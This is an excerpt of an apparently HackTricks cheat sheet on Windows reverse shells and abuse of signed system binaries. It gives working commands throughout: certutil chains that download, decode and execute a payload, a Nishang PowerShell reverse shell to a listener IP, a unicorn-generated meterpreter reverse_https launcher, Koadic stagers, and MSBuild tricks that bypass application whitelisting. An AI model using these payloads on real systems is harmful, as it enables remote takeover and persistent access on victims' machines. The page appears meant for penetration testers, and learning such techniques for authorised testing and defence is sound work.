...
source_url: https://hacktricks.wiki/generic-hacking/reverse-shells/windows.html
...
Windows uses access tokens and privileges for process security, and Windows 11 also includes an optional `sudo` command.<sup>[\[11\]](#references)[\[12\]](#references)</sup> It is useful to know **how** some **binaries** can be (ab)used to perform unexpected actions such as **executing arbitrary code**.[\[13\]](#references)

The baseline Windows reverse-shell payloads collected below are also documented in the HighOn.Coffee and PayloadsAllTheThings cheat sheets; adjust paths and installed interpreters for the target.[\[1\]](#references)[\[4\]](#references)
...
Payload written on disk: **NO** (*at least nowhere I could find using procmon !*).[\[5\]](#references)
...
Payload written on disk: **WebDAV client local cache**.[\[5\]](#references)
...
```
**You can download & execute very easily a Koadic zombie using the stager hta**.[\[3\]](#references)
...
Reuse the scriptlet shown in the [mshta - sct](#mshta-sct) section; its leading comment contains the corresponding `rundll32.exe` launcher.[\[8\]](#references)
...
Besides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:[\[6\]](#references)
...
See also: ClickFix clipboard‑to‑PowerShell variant that stages a JS loader and later persists with `regsvr32`.[\[6\]](#references)[Clipboard Hijacking](../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.html)
...
```
**You can download & execute very easily a Koadic zombie using the stager regsvr**.[\[3\]](#references)

## [Certutil](#certutil)

Download a B64dll, decode it and execute it.[\[5\]](#references)

```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Download a B64exe, decode it and execute it.[\[5\]](#references)
...
## [**Cscript/Wscript**](#cscriptwscript)
...
```
Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).[\[10\]](#references)
...
**You can download & execute very easily a Koadic zombie using the stager wmic**.[\[3\]](#references)
...
```
This project documents MSBuildShell as a PowerShell host that can bypass application whitelisting and `powershell.exe` restrictions and provide a PowerShell-like shell.[\[16\]](#references)

Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).[\[16\]](#references)
...
Compile C# code in the victim machine.[\[17\]](#references)[\[18\]](#references)
...
[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182).[\[2\]](#references)
...
[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).[\[2\]](#references)

## [Powershell Shells](#powershell-shells)

### [PS-Nishang](#ps-nishang)

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

In the **Shells** folder, there are a lot of different shells. To download and execute Invoke-*PowerShellTcp.ps1* make a copy of the script and append to the end of the file:[\[19\]](#references)

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Start serving the script in a web server and execute it on the victim’s end:[\[19\]](#references)[\[20\]](#references)[\[21\]](#references)
...
Download, start a web server, start the listener, and execute it on the victim’s end:[\[22\]](#references)
...
Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files…[\[22\]](#references)
...
Create a powershell launcher, save it in a file and download and execute it.[\[23\]](#references)[\[26\]](#references)[\[27\]](#references)
...
Create a powershell version of metasploit backdoor using unicorn.[\[24\]](#references)

```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Start msfconsole with the created resource:[\[24\]](#references)

```
msfconsole -r unicorn.rc
```
Start a web server serving the *powershell_attack.txt* file and execute in the victim:[\[24\]](#references)
...
[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console with some offensive PS modules preloaded (cyphered)[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)
[WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX).[\[25\]](#references)
